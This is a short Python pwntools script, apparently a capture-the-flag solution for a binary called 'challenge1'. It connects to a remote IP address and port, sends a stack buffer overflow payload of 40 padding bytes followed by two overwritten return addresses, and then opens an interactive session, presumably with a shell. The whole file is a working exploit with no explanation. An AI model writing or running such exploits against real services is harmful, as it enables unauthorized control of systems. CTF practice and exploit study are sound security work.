from pwn import *
#io = process('challenge1')
io  = remote('46.101.107.117',2102)
io.recvuntil('name!', drop=True)
payload = 40 * b'A' + p64(0x40087f) + p64(0x40086d)
io.sendline(payload)
io.interactive()